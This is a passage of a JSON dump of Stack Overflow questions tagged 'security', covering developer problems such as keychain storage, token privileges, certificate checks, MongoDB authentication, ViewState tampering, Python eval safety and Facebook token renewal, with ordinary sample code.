that?</p>\n\n<p>What is the proper way to secure this page considering i/losing my merchant account could be the one at risk?</p>\n\n<p>Thank you in advance</p>\n"},{"tags":["security","website","web-security","restrictions"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":20,"score":0,"question_id":13291688,"title":"How to prevent unauthorized computers from accessing a website","body":"<p>I've developed a web application for a company. Because the company has offices in all the states in the country, the web application will be uploaded to the internet.</p>\n\n<p>Is it possible to restrict access to the web application to only know computers used by the company; maybe by using their <code>MAC</code> address?</p>\n\n<p>Or is there an efficient way to limit access to a website to only recognized computers? Thanks for any suggestions.</p>\n"},{"tags":["objective-c","ios","security","xcode4.5"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":19,"score":0,"question_id":13291846,"title":"unable to check if a configuration profile exists on the iPhone - Objective-C","body":"<p>I am trying to check if a configuration profile exists on the iPhone , I found the following tutorial on how to do it :\n<a href=\"http://alex.tapmania.org/2011/09/check_conf_prof_is_installed_ios.html\" rel=\"nofollow\">http://alex.tapmania.org/2011/09/check_conf_prof_is_installed_ios.html</a></p>\n\n<p>which , for me , translates into the following code :</p>\n\n<pre><code>NSString * certPath = [[NSBundle mainBundle] pathForResource:@\"certificate\" ofType:@\"mobileconfig\"];\n    SecTrustRef trust;\n    NSData * certData = [NSData dataWithContentsOfFile:certPath];\n    SecCertificateRef cert = SecCertificateCreateWithData(NULL, (__bridge CFDataRef) certData);\n    SecPolicyRef policy = SecPolicyCreateBasicX509();\n    OSStatus err = SecTrustCreateWithCertificates((__bridge CFArrayRef) [NSArray arrayWithObject:(__bridge id)cert],policy, &amp;trust);\n\n    SecTrustResultType  trustResult = -1;\n    err = SecTrustEvaluate(trust, &amp;trustResult);\n\n\n    if (trustResult ==4) {\n        label.text=@\"Profile installed\";\n    }\n    else{\n        label.text=@\"Profile not installed\";\n    }\n</code></pre>\n\n<p>the application crashes at the line :</p>\n\n<pre><code>OSStatus err = SecTrustCreateWithCertificates((__bridge CFArrayRef) [NSArray arrayWithObject:(__bridge id)cert],policy, &amp;trust);\n</code></pre>\n\n<p>I also noticed that at this stage <code>cert</code> doesn t have any memory allocated in it .</p>\n\n<p>what is wrong ? is this the correct procedure ? if no , is there another tutorial that is more beneficial ?</p>\n\n<p>Thanks!</p>\n"},{"tags":["c++","security","methods","token"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":33,"score":1,"question_id":13291292,"title":"Program using tokens and privileges","body":"<p>I want to create a C++ program with limited privileges.  I made some research on the internet and found out that I have to create a token and then use the AdjustTokenPrivileges() method to alter its privileges.</p>\n\n<p>However, I didn't quite understand how this is to be done.  Can someone please provide me with an example of how to create a token and disable its privileges?  Thanks :)</p>\n"},{"tags":["iphone","ios","security","design"],"answer_count":6,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":340,"score":4,"question_id":7499872,"title":"How to safely store credentials entered in Application Preferences?","body":"<p>My iPhone App connects to a web service using a username and a password. </p>\n\n<p><del>I prefer to save the credentials in the Application Preferences (settings bundle) like the Mail App. Is this secure enough? Is it possible to save those values to the keychain (via Application Preferences)?</del></p>\n\n<p><em>Edit:</em> </p>\n\n<p><strong>I want my users to enter their credentials in the Application Preferences of my App</strong>. Normally, I can retrieve this data in my app with NSUserDefaults. But Application Preferences saves the data as plain text and it's neither encrypted nor hashed. Is there a safe way? Eg. I know the keychain on the iPhone and I find it great! <strong>Can I use the keychain to hold the credentials entered in Application Preferences?</strong></p>\n\n<p>Food for thought: How does Apple do it? I mean, when I want to use the Mail App, I provide my username and password in the Application Preferences. Are those values stored as plaintext?</p>\n"},{"tags":["php","security","symfony2","symfony-2.1"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":19,"score":0,"question_id":13233026,"title":"Catch AccountStatusException","body":"<p>I would like to implement a custom logic for my users implementing the <a href=\"http://api.symfony.com/2.1/Symfony/Component/Security/Core/User/AdvancedUserInterface.html\" rel=\"nofollow\">AdvancedUserInterface</a></p>\n\n<p>I would like to allow non-enabled users to access some zones (like the account zone where they can change their e-mail if they made a mistake).</p>\n\n<p>According to the documentation : </p>\n\n<blockquote>\n  <p>If any of the methods in this interface return false, authentication\n  will fail.</p>\n  \n  <p>If you need to perform custom logic for any of these situations, then\n  you will need to register an exception listener and watch for the\n  specific exception instances thrown in each case. All exceptions are a\n  subclass of AccountStatusException</p>\n</blockquote>\n\n<p>So I tried to create a Listener by adapting <a href=\"http://symfony.com/doc/current/cookbook/service_container/event_listener.html\" rel=\"nofollow\">this cookbook article</a> to the security events :</p>\n\n<pre><code>&lt;?php\n\nnamespace Acme\\DemoBundle\\Listener;\n\n\nuse Symfony\\Component\\Security\\Core\\SecurityContextInterface;\n\nuse Symfony\\Component\\Security\\Core\\Exception\\AccountStatusException;\n\nclass NecdocPatientExceptionListener\n{\n    public function onKernelException($event)\n    {\n        // Handle event code goes here\n    }\n}\n</code></pre>\n\n<p>And I've added it to the bundle's services.xml :</p>\n\n<pre><code>services:\n    kernel.listener.acme_user_exception_listener:\n        class: Acme\\DemoBundle\\Listener\\AcmeExceptionListener\n        tags:\n            - { name: kernel.event_listener, event: security.authentication.success, method: onKernelException }\n</code></pre>\n\n<p>This catches <strong>AuthenticationFailureEvent</strong> (the onKernelException is called) but not <strong>AccountStatusException</strong> (the onKernelException is not called)</p>\n\n<p>I've been looking to the Security component code, and it seems that exceptions are caught without triggering any events.\nIs there a way to catch those exceptions anyways ?</p>\n"},{"tags":["security","internet-explorer","spam-prevention"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":183,"score":2,"question_id":9501120,"title":"How can I prevent IE form auto-fill from filling in a honeypot field?","body":"<p>I have implemented honeypot fields on the majority of my client's contact forms in order to prevent spamming. However, I'm noticing that IE's form auto-fill option fills in the honeypot field, and thus triggers my anti-spam logic. How can I prevent this? </p>\n\n<p>I've tried giving the form field a different name - it is currently called <code>emailConfirmation</code>, but I've tried <code>conf_em</code> and <code>liame</code>, and it's still auto-filling. I've also tried moving the honeypot field to the very bottom of the form - nowhere near the existing <code>email</code> input.</p>\n"},{"tags":["ios","security","unit-testing","ios-simulator","keychain"],"answer_count":1,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":97,"score":4,"question_id":13087175,"title":"Keychain Services API fails with errSecNotAvailable in iphonesimulator 6.0","body":"<p>Calls to the the Keychain Services fail with <strong>errSecNotAvailable</strong> when executing a target using the command line tools and the iphone simulator is set to Hardware version 6.0 (10A403). If I change the simulator version to other previous version (4.3, 5.0, 5.1) and re-execute using the same command line script the calls succeed.</p>\n\n<p>I'm running latest XCode 4.5 and the command line tools were downloaded from within XCode.</p>\n\n<p>To reproduce this error just do the following:</p>\n\n<ol>\n<li>Setup an ios library project with a OCUnit target</li>\n<li>Set Base SDK to 6.0</li>\n<li>Set iOS Deployment Target to 4.3</li>\n<li>Copy and paste the code st the end of the post into the test project (it will only try to store a password and retrieve it)</li>\n<li>Add the Security.framework to the OCUnit target</li>\n</ol>\n\n<p>Execute the OCUnit target in XCode and see the test pass with whatever Hardware Version is set in the iphone simulator (just change it between executions).</p>\n\n<p>Execute the OCUnit target from the command line using:</p>\n\n<pre><code>xcodebuild -target TARGET_NAME_HERE -sdk iphonesimulator -configuration Release TEST_AFTER_BUILD=YES\n</code></pre>\n\n<p>with iphone simulator set to Hardware Version 6.0 and the test will <strong>fail</strong>. If you change the iphone simulator Hardware Version to 4.3, 5.0 or 5.1 and execute the command line script again the test will <strong>succeed</strong>.</p>\n\n<p>Is this a command line tool problem? an iphone simulator problem? an OCUnit target running from the command line problem?</p>\n\n<p>Who likes having unit tests that only pass when comets are aligned??</p>\n\n<p>Any ideas?</p>\n\n<p>Here is the code:</p>\n\n<pre><code>#define KEYCHAIN_ITEM_ATTRIBUTES (id)kSecClassGenericPassword, kSecClass, @\"MyService\", kSecAttrService, @\"MyPassword\", kSecAttrAccount\n\nconst NSString* MyPassword = @\"blabla\";\n\n- (void)testExample\n{\n    // remove previous keychain item\n    OSStatus status = SecItemDelete((CFTypeRef)[NSDictionary dictionaryWithObjectsAndKeys:KEYCHAIN_ITEM_ATTRIBUTES, nil]);\n    NSLog(@\"SecItemDelete status:%ld\",status);\n    NSParameterAssert(status == errSecSuccess || status == errSecItemNotFound);\n\n    // add keychain item with new value\n    NSData *data = [MyPassword dataUsingEncoding:NSUTF8StringEncoding];\n    status = SecItemAdd((CFTypeRef)[NSDictionary dictionaryWithObjectsAndKeys:KEYCHAIN_ITEM_ATTRIBUTES, data, kSecValueData, nil], NULL);\n    NSLog(@\"SecItemAdd status:%ld\",status);\n    NSParameterAssert(status == errSecSuccess);\n\n    // get password\n    status = SecItemCopyMatching((CFTypeRef)[NSDictionary dictionaryWithObjectsAndKeys:KEYCHAIN_ITEM_ATTRIBUTES,\n                                             kSecMatchLimitOne, kSecMatchLimit, kCFBooleanTrue, kSecReturnData, nil], (CFTypeRef *)&amp;data);\n    NSLog(@\"SecItemCopyMatching status:%ld\",status);\n    NSParameterAssert(status == errSecSuccess);\n\n    if (status == errSecItemNotFound)\n        NSLog(@\"SecItemCopyMatching status:%ld\", status);\n    else\n        NSLog(@\"SecItemCopyMatching result:%@\",[[[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding] autorelease]);\n}\n</code></pre>\n\n<p>Regarding securityd daemon not being launched, I can check it IS being launched, using </p>\n\n<pre><code>launchctl list | grep securityd\n</code></pre>\n\n<p>after the simulator starts, and getting</p>\n\n<pre><code>-   0   com.apple.iPhoneSimulator:com.apple.securityd\n</code></pre>\n\n<p>I also tried stopping this securityd daemon and launch another manually... I looked at GTM's RunIPhoneUnitTest.sh script for a simple line I could use, but when I try this</p>\n\n<pre><code>launchctl submit -l ios6securityd -- /Applications/Xcode.app/Contents/Developer/Platforms/iPhoneSimulator.platform/Developer/SDKs/iPhoneSimulator6.0.sdk/usr/libexec/securityd\n</code></pre>\n\n<p>gives me a -5 status code on that daemon.</p>\n"},{"tags":["security","java-7"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":13,"score":0,"question_id":13287011,"title":"Java 7 security issues information","body":"<p>Maybe not the correct platform for a question such as this, but does anyone know where (or if) you can find out detailed information regarding the current Java 7 SE security issues, like <a href=\"http://www.security-explorations.com/en/SE-2012-01-poc.html\" rel=\"nofollow\">these ones</a>?</p>\n\n<p>I presume these are not published, as this would essentially document how to exploit the vulnerabilities, but just thought I would ask in case there is somewhere you can get some more information that expands upon <em>\"complete Java security sandbox bypass\"</em>.  I found <a href=\"http://tech.puredanger.com/java7/\" rel=\"nofollow\">Alex Millers blog</a> but it doesn't appear to have been updated for a couple of years.</p>\n"},{"tags":["linux","security","certificate","openssl","ssl-certificate"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":3280,"score":2,"question_id":7885785,"title":"Using openssl to get the certificate from a server","body":"<p>I am trying to get the certificate of a remote server, which I can then use to add to my keystore and use within my java application.</p>\n\n<p>A senior dev (who is on holidays :(  ) informed me I can run this:</p>\n\n<pre><code>openssl s_client -connect host.host:9999\n</code></pre>\n\n<p>To get a raw certificate dumped out, which I can then copy and export. I receive the following output:</p>\n\n<pre><code>depth=1 /C=NZ/ST=Test State or Province/O=Organization Name/OU=Organizational Unit Name/CN=Test CA\nverify error:num=19:self signed certificate in certificate chain\nverify return:0\n23177:error:14094410:SSL routines:SSL3_READ_BYTES:sslv3 alert handshake failure:s3_pkt.c:1086:SSL alert number 40\n23177:error:140790E5:SSL routines:SSL23_WRITE:ssl handshake failure:s23_lib.c:188:\n</code></pre>\n\n<p>I have also tried with this option</p>\n\n<pre><code>-showcerts \n</code></pre>\n\n<p>and this one (running on debian mind you)</p>\n\n<pre><code>-CApath /etc/ssl/certs/ \n</code></pre>\n\n<p>But get the same error.</p>\n\n<p><a href=\"http://gagravarr.org/writing/openssl-certs/personal.shtml\" rel=\"nofollow\">This source</a> says I can use that CApath flag but it doesn't seem to help. I tried multiple paths to no avail.</p>\n\n<p>Please let me know where I'm going wrong.</p>\n"},{"tags":["java","javascript","database","security","mongodb"],"answer_count":3,"favorite_count":1,"up_vote_count":3,"down_vote_count":3,"view_count":67,"score":0,"question_id":13276329,"title":"MongoDB Security issue","body":"<p>My confidence in MongoDB security is shaken, and I'm hopping it will be restored with an explanation that I'm doing something wrong...</p>\n\n<p>I've created MongoDB's Windows Service like this:</p>\n\n<blockquote>\n  <p>mongod --logpath \"C:\\mongoDB\\logs\" --logappend --dbpath\n  \"C:\\mongoDB\\data\\db\" --serviceName MongoDB --serviceDisplayName \"Mongo\n  DB\" --port 27017 <strong>--auth</strong> --install</p>\n</blockquote>\n\n<p>I've then created a DB and added the administration user to that DB's system.users collection.</p>\n\n<p>Then I filled that DB with some random information to a test collection I've created.</p>\n\n<p>Up until now, everything is great and I am able to access the DB only if I have the administrator credentials...</p>\n\n<p>Now the important part...</p>\n\n<p>I removed the service like this:</p>\n\n<blockquote>\n  <p>mongod --remove --serviceName \"MongoDB\"</p>\n</blockquote>\n\n<p>Then I recreated the service but with no authentication like this:</p>\n\n<blockquote>\n  <p>mongod --logpath \"C:\\mongoDB\\logs\" --logappend --dbpath\n  \"C:\\mongoDB\\data\\db\" --serviceName MongoDB --serviceDisplayName \"Mongo\n  DB\" --port 27017 <strong>--noauth</strong> --install</p>\n</blockquote>\n\n<p>What amazes me is that I am now able to access the DB I've created with now authentication...</p>\n\n<p>Please tell me I should have done something differently.</p>\n"},{"tags":["asp.net-mvc","entity-framework","security","architecture"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":37,"score":1,"question_id":13285799,"title":"ASP.MVC best security practices for control access to Entities","body":"<p>Let we have system with following entities:</p>\n\n<pre><code>public class Doctor\n{\n    public int ID { get; set; }\n    public int DepartmentID { get; set; }\n    public string Name { get; set; }\n    public ICollection&lt;Recipe&gt; Recipes { get; set; }\n}\n\npublic class Patient\n{\n    public int ID { get; set; }\n    public string Name { get; set; }\n    public ICollection&lt;Recipe&gt; Recipes { get; set; }\n}\n\npublic class Recipe\n{\n    public int ID { get; set; }\n    public int DoctorID { get; set; }\n    public int PatientID { get; set; }\n    public Doctor Doctor { get; set; }\n    public Patient Patient { get; set; }\n    public ICollection&lt;RecipeDetails&gt; Details { get; set; }\n}\n\npublic class RecipeDetails\n{\n    public int ID { get; set; }\n    public Guid SomeGuid { get; set; }\n    public double SomeValue { get; set; }\n}\n</code></pre>\n\n<p>Also we have requirements:</p>\n\n<ul>\n<li>Doctor should be able to edit his recipes</li>\n<li>Doctor should be able to see only recipes from doctors within his department</li>\n<li>Doctor should be able to perform search by available recipes</li>\n<li>Doctor should be able to generate reports by available recipes details</li>\n</ul>\n\n<p>For now I've implemented following security check:</p>\n\n<pre><code>public void ValidateAccess(Doctor doctor, Recipe aRecipe, EntityAction action)\n{\n    if (action == EntityAction.Modify &amp;&amp; doctor.ID == aRecipe.Doctor.ID)\n        return;\n    if (action == EntityAction.Read &amp;&amp; doctor.DepartmentID == aRecipe.Doctor.DepartmentID)\n        return\n    throw new SecurityException();\n}\n</code></pre>\n\n<p>That works perfect for simple methods when i have receipe entity, I can easy validate access by caling this method at the begining of my logic method.</p>\n\n<p>But now I have problem, this solution won't work for search and reporting when I don't have exact entity but have some statistics on them.</p>\n\n<p>Lets imagine that I want to generate report for patients with name \"aName\" that have receipes with component \"someGuid\", I will have some query with 2 criterias :</p>\n\n<pre><code>var res = RecipeRepository.Query(r =&gt; aName.Contains(r.Patient.Name)).SelectMany(r =&gt; r.Details).Where(d =&gt; d.SomeGuid == someGuid).Sum(d =&gt; d.SomeValue);\n</code></pre>\n\n<p>This query is not correct, it will display statistics for all recipes, including those which should be hidden.\nTo fix that, we should add our access condition to our query: </p>\n\n<pre><code>currentDoctor.DepartmentID == r.Doctor.DepartmentID\n</code></pre>\n\n<p>So now I have query:</p>\n\n<pre><code>var res = RecipeRepository.Query(r =&gt; aName.Contains(r.Patient.Name) &amp;&amp; currentDoctor.DepartmentID == r.Doctor.DepartmentID).SelectMany(r =&gt; r.Details).Where(d =&gt; d.SomeGuid == someGuid).Sum(d =&gt; d.SomeValue);\n</code></pre>\n\n<p>The problem is that I should add this part to each query in the system that makes any calculations on receipes.</p>\n\n<p>What pattern or practice could be applied to make this solution easier and prevent copy-pasting expression to each query?\nI'll appreciate your answers and advices.</p>\n"},{"tags":["c#",".net","security","authentication",".net-4.0"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":19,"score":0,"question_id":13285805,"title":"Authenticate google certificate by c# code?","body":"<p>When I browse <em>google.com</em> I can ensure that it is <em>google.com</em> by clicking in the address bar : </p>\n\n<p><img src=\"http://i.stack.imgur.com/1Vr2X.jpg\" alt=\"enter image description here\">\n<img src=\"http://i.stack.imgur.com/IMjYq.jpg\" alt=\"enter image description here\"></p>\n\n<p>But let's assume google is exposing  <code>Service1</code>, and I - using c# consume this service (wcf) - </p>\n\n<p>How can my service be assure that he is connecting to google.com ? </p>\n\n<p>I know there is a certificate involved here. </p>\n\n<p>I already  <em>know</em> how to read local certificates from my store. but this certificate is not in my store.</p>\n\n<p>Question : </p>\n\n<p>So <strong>How</strong> do ( and in what <strong>stage</strong>) can I read google's certificate data and to assure i'm connecting to them? </p>\n\n<p>Thank you.</p>\n"},{"tags":["asp.net","security","reportviewer","report"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":4395,"score":0,"question_id":3679284,"title":"Report Viewer error: The request failed with HTTP status 401: Unauthorized","body":"<p>I have a asp.net c# web application with contains reports in remote processing mode.  I am using the report-viewer control to render the reports.  When I run the application in debug mode, I'm able to view my reports however when I publish the application to a different server I get this error message:</p>\n\n<p>The request failed with HTTP status 401: Unauthorized. </p>\n\n<p>My report server is on a different server than the location of my published web application.  I have added new role assignment to my report server and also added     to my web.config but the error persists.  I think I am missing something in my aspx page for reportviewer.</p>\n\n<p>Any input would be appreciated.</p>\n"},{"tags":["asp.net","security","sql-injection","viewstate"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":36,"score":2,"question_id":13282829,"title":"Can malicious users modify viewstate?","body":"<p>If ViewStatemac is enabled in an ASP.NET application can a user modify what is in ViewState and successfully pass it back to the server?</p>\n\n<p>I have an applicaiton (that someone else wrote) that is using what is in ViewState to create an non-parameterized <code>ORDER BY</code> clause in a SQL query.  Should I be worried about SQL Injection?</p>\n"},{"tags":["python","security","eval"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":100,"score":2,"question_id":13066594,"title":"Is there a way to secure strings for Python's eval?","body":"<p>There are many questions on SO about using Python's eval on <strong>insecure strings</strong> (eg.: <a href=\"http://stackoverflow.com/questions/661084/security-of-pythons-eval-on-untrusted-strings\">Security of Python's eval() on untrusted strings?</a>, <a href=\"http://stackoverflow.com/questions/3513292/python-make-eval-safe\">Python: make eval safe</a> and <a href=\"http://stackoverflow.com/questions/661084/security-of-pythons-eval-on-untrusted-strings\">Security of Python's eval() on untrusted strings?</a>). The unanimous answer is that this is a bad idea.</p>\n\n<p>However, I found little information on which strings can be considered safe (if any).\nNow I'm wondering if there is a definition of \"safe strings\" available (eg.: a string that only contains lower case ascii chars or any of the signs +-*/()). The exploits I found generally relied on either of _.,:[]'\" or the like. Can such an approach be secure (for use in a graph painting web application)?</p>\n\n<p>Otherwise, I guess using a parsing package as Alex Martelli suggested is the only way.</p>\n\n<p>EDIT:\nUnfortunately, there are neither answers that give a compelling explanation for why/ how the above strings are to be considered insecure (a tiny working exploit) nor explanations for the contrary. I am aware that using eval should be avoided, but that's not the question. Hence, I'll award a bounty to the first who comes up with either a working exploit or a really good explanation why a string mangled as described above is to be considered (in)secure.</p>\n"},{"tags":["c#","facebook","security","facebook-c#-sdk","token"],"answer_count":3,"favorite_count":5,"up_vote_count":12,"down_vote_count":0,"view_count":2293,"score":12,"question_id":10388272,"title":"How to transparently renew  the Facebook access token while processing a service method which uses Facebook API calls?","body":"<p>I have a WCF service which runs in IIS 7.5 and VS 2010. This service has some methods which internally use the <a href=\"http://facebooksdk.codeplex.com/\">Facebook C# SDK</a> (version 4.1, not latest) in order to perform some GET and POST from/to Facebook. Since Facebook will soon <a href=\"http://developers.facebook.com/roadmap/offline-access-removal/\">remove</a> the <code>offline_access</code> I have to handle the situation where an access token is expired.</p>\n\n<p>I have understood the way the authentication is performed (in order to get the code and after having the code to get the access token) in order to use the Graph API for getting Facebook information (as presented <a href=\"http://developers.facebook.com/attachment/serversideflow.png\">here</a>).</p>\n\n<p>I have two questions:<br></p>\n\n<ul>\n<li>When my service method is called and I retrieve the token of the\nappropriate user from my DB, is there a way to know if the access token\nis expired or not? <br>I have <a href=\"http://developers.facebook.com/docs/authentication/access-token-expiration/\">read</a> that when a Facebook API call is performed and the access token is expired then the following exception is thrown: <code>OAuthException</code>. But is there any better way to detect the expiration? I don't want to <br>\n<ol>\n<li>Call the Facebook API</li>\n<li>Handle the exception</li>\n<li>Renew the access token and finally </li>\n<li>Repeat the initial call with the new access token.<br></li>\n</ol></li>\n<li>Is it possible to renew the access token of the user transparently (store it also in the DB) and <em>continue</em> to handle the service method?\nIn <a href=\"http://csharpsdk.org/docs/web/handling-expired-access-tokens\">this</a> resource, the important (\"Renewing an Access Token\") part is missing (declared as\n[todo])</li>\n</ul>\n\n<p>I would like to achieve the following scheme, in the implementation of the Service Method:<br></p>\n\n<pre><code>sc = SocialNetworkAccountDao.GetByUser(user)\n\nisExpired = call method to check if the sc.token is expired.\n\nif (isExpired)\n\n{\n\n  newToken = call method for getting new access token\n\n  sc.token = newToken;\n\n  SocialNetworkAccount.Update(sc);\n\n}\n\nFacebook = new Facebook (sc.token)\n\nFacebook.Post( ..... )\n\n--\n</code></pre>\n\n<p>The process to communicate with the <code>QAuth</code> dialog is asynchronous (a redirect is performed), and the communication with access token url to get the access token this is performed synchronously.<br><br>Final Question:<br></p>\n\n<ul>\n<li>Is there a way the service method to wait for the new access token we\nretrieve from the request / callback with Facebook in order to\ncontinue later with the new access token?</li>\n</ul>\n"},{"tags":["c#","asp.net","vb.net","security","encryption"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":150,"score":3,"question_id":12546652,"title":"ASP.net Encrypt Files After Upload / Decrypt To User","body":"<p>I am doing some research and development into a possible project that my potential client is discussing with me.</p>\n\n<p>I am looking at creating an asp.net 4.5 web application that will be accessed over the web and hold some pretty sensitive information. The information is going to be uploaded via the webApp and the files stored on the server for viewing / retrieval later. I want to ensure the information is securely uploaded and stored. in order to do this I will propose a EV SSL certificate is used across the application at all times and some sort of encryption applied to the files (jpeg,pdf,txt) to ensure that if someone gained access to the application at server level the files are not directly viewable without the application too, this is where I am looking for suggestions or improvements.</p>\n\n<p>My research has guided me to AES encryption on the files, again is this going to be sufficient to protect the files ? Should encryption be applied at OS level (win2008) ? Should I store the files in the database ?</p>\n\n<p>The files must be readable back to the user on the webApp and viewable in the browser.</p>\n\n<p>Should any further information be needed, please ask!</p>\n"},{"tags":["linux","windows","security","operating-system","computer-architecture"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":13281773,"title":"Inter-process real memory page read?","body":"<p>If a process runs right after another process quit (for example) the second process may get allocated some of the first process real pages. Is it possible that the second process may be able to read some of the first process's data? (Question for Windows and/or Linux OSs)</p>\n"},{"tags":["security","x509certificate"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":68,"score":1,"question_id":9987854,"title":"how to add a custom attribute x509 certificates","body":"<p>is there a way we can add additional attribute x509 certificate. I am using vs.net command tools to generate the x509 certificates. once i want add a custom attribute to it. is this possible?</p>\n\n<p>Thanks</p>\n"},{"tags":["java","php","forms","security","applet"],"answer_count":0,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":85,"score":1,"question_id":12684778,"title":"Applet Upload Error","body":"<p>I want to upload some files from client pc to my web server and I am using following code in Java applet I have also signed applet successfully and it prompt for Trust the applet see code here, but it does not uploads the file</p>\n\n<pre><code>import java.applet.Applet;\nimport java.net.*;\nimport java.io.*;\nimport java.util.*;\npublic class UploaderExample extends Applet\n{\nprivate static final String Boundary = \"--7d021a37605f0\";\n\npublic void upload(URL url, List&lt;File&gt; files) throws Exception\n{\n    HttpURLConnection theUrlConnection = (HttpURLConnection) url.openConnection();\n    theUrlConnection.setDoOutput(true);\n    theUrlConnection.setDoInput(true);\n    theUrlConnection.setUseCaches(false);\n    theUrlConnection.setChunkedStreamingMode(1024);\n\n    theUrlConnection.setRequestProperty(\"Content-Type\", \"multipart/form-data; boundary=\"\n            + Boundary);\n\n    DataOutputStream httpOut = new DataOutputStream(theUrlConnection.getOutputStream());\n\n    for (int i = 0; i &lt; files.size(); i++)\n    {\n        File f = files.get(i);\n        String str = \"--\" + Boundary + \"\\r\\n\"\n                   + \"Content-Disposition: form-data;name=\\\"file\" + i + \"\\\"; filename=\\\"\" + f.getName() + \"\\\"\\r\\n\"\n                   + \"Content-Type: image/png\\r\\n\"\n                   + \"\\r\\n\";\n\n        httpOut.write(str.getBytes());\n\n        FileInputStream uploadFileReader = new FileInputStream(f);\n        int numBytesToRead = 1024;\n        int availableBytesToRead;\n        while ((availableBytesToRead = uploadFileReader.available()) &gt; 0)\n        {\n            byte[] bufferBytesRead;\n            bufferBytesRead = availableBytesToRead &gt;= numBytesToRead ? new byte[numBytesToRead]\n                    : new byte[availableBytesToRead];\n            uploadFileReader.read(bufferBytesRead);\n            httpOut.write(bufferBytesRead);\n            httpOut.flush();\n        }\n        httpOut.write((\"--\" + Boundary + \"--\\r\\n\").getBytes());\n\n    }\n\n    httpOut.write((\"--\" + Boundary + \"--\\r\\n\").getBytes());\n\n    httpOut.flush();\n    httpOut.close();\n\n    // read &amp; parse the response\n    InputStream is = theUrlConnection.getInputStream();\n    StringBuilder response = new StringBuilder();\n    byte[] respBuffer = new byte[4096];\n    while (is.read(respBuffer) &gt;= 0)\n    {\n        response.append(new String(respBuffer).trim());\n    }\n    is.close();\n    System.out.println(response.toString());\n}\n\npublic static void main(String[] args) throws Exception\n {\n    List&lt;File&gt; list = new ArrayList&lt;File&gt;();\n    list.add(new File(\"C:\\\\square.png\"));\n    list.add(new File(\"C:\\\\narrow.png\"));\n    UploaderExample uploader = new UploaderExample();\n    uploader.upload(new URL(\"http://localhost/test2/upload.php\"), list);\n }\n\n}\n</code></pre>\n\n<p>Console Output is</p>\n\n<pre><code>security: User has granted the priviledges to the code for this session only\nsecurity: Adding certificate in Deployment session certificate store\nsecurity: Added certificate in Deployment session certificate store\nsecurity: Saving certificates in Deployment session certificate store\nsecurity: Saved certificates in Deployment session certificate store\nsecurity: Validate the certificate chain using CertPath API\nsecurity: The certificate hasnt been expired, no need to check timestamping info\nsecurity: Found jurisdiction list file\nsecurity: No need to checking trusted extension for this certificate\nsecurity: The CRL support is disabled\nsecurity: The OCSP support is disabled\nsecurity: This OCSP End Entity validation is disabled\nsecurity: Checking if certificate is in Deployment denied certificate store\nsecurity: Checking if certificate is in Deployment permanent certificate store\nsecurity: Checking if certificate is in Deployment session certificate store\nbasic: Plugin2ClassLoader.getPermissions CeilingPolicy allPerms\nsecurity: Validate the certificate chain using CertPath API\nsecurity: The certificate hasnt been expired, no need to check timestamping info\nsecurity: Found jurisdiction list file\nsecurity: No need to checking trusted extension for this certificate\nsecurity: The CRL support is disabled\nsecurity: The OCSP support is disabled\nsecurity: This OCSP End Entity validation is disabled\nsecurity: Checking if certificate is in Deployment denied certificate store\nsecurity: Checking if certificate is in Deployment permanent certificate store\nsecurity: Checking if certificate is in Deployment session certificate store\nbasic: Applet loaded.\nbasic: Applet resized and added to parent container\nbasic: PERF: AppletExecutionRunnable - applet.init() BEGIN ; jvmLaunch dt 121613 us,       pluginInit dt 29241825 us, TotalTime: 29363438 us\nbasic: Applet initialized\nbasic: Starting applet\nbasic: completed perf rollup\nbasic: Applet made visible\nbasic: Applet started\nbasic: Told clients applet is started\n</code></pre>\n"},{"tags":["mysql","security","encryption","cryptography","aes"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":25,"score":1,"question_id":13276725,"title":"Using AES_ENCRYPT in another mode","body":"<p>Is it possible to use MySQL's AES_ENCRYPT and AES_DECRYPT functions in a mode other than ECB (like CBC)? Various questions on Stack Overflow talk about how MySQL uses ECB mode and to not use these functions. Am I better off doing the encryption/decryption in the programming language I'm working with?</p>\n"},{"tags":["java","security","https"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":19,"score":0,"question_id":13281826,"title":"Apache Commons HttpClient for HTTPS call","body":"<p>Does HttpClient uses cacerts that is available in every JRE? do i need to configure the HttpClient with SSL to invoke a HTTPS endpoint.</p>\n\n<p>The endpoint uses GeoTrust which is a trusted authority by cacerts withing JRE. Does HttpClient handle the security?</p>\n"},{"tags":["c#","security","arguments","command-line-arguments","truecrypt"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":13279436,"title":"See command line arguments being passed to a program","body":"<p>You may skip this part</p>\n\n<blockquote>\n  <p>I am using a batch file that I have in my thumb drive in order to\n  mount a true crypt volume. I created that batch file with the help of\n  <a href=\"http://www.truecrypt.org/docs/?s=command-line-usage\" rel=\"nofollow\">this link</a>. on that batch file I have the username and password\n  that I pass as arguments to trueCrypt.exe in order for it to be\n  mounted.</p>\n</blockquote>\n\n<hr>\n\n<p>Anyways so my question is: will it be possible to see the arguments being passed to a program from a third party process? In other words, will it be 